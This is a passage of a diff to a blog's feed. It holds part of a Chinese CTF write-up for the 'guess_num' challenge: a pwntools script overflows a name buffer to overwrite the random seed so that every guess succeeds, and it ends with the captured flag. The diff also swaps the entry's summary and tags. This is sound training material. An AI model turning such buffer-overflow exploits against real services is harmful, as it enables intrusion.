class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数，即:v6 = rand() % 6 + 1;</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your guess number:"</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> io    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./guess_num"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">49792</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 填充垃圾字符，并将seed覆盖为1</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 第一次输入，可随便输入</span>    srand<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 执行srand函数保证每次都能猜中</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{a1d36b526f5cc7080c63a2338ee0255b}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/1nLR25tdK3Wk8Ne.png" alt="攻防世界-guess_num7.png"></p>]]></content>
-    
-    
-    <summary type="html">按照程序中函数的逻辑，利用python编写对应的c语言函数来绕过程序的判断</summary>
+    <summary type="html">从代码变成程序的底层逻辑，还是需要了解一点的</summary>
     
     
     
-    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <category term="Linux" scheme="https://4ss1du0us.github.io/categories/Linux/"/>
     
     
-    <category term="CTF刷题" scheme="https://4ss1du0us.github.io/tags/CTF%E5%88%B7%E9%A2%98/"/>
+    <category term="CTF笔记" scheme="https://4ss1du0us.github.io/tags/CTF%E7%AC%94%E8%AE%B0/"/>
     
-    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
+    <category term="Linux" scheme="https://4ss1du0us.github.io/tags/Linux/"/>
     
   </entry>
   
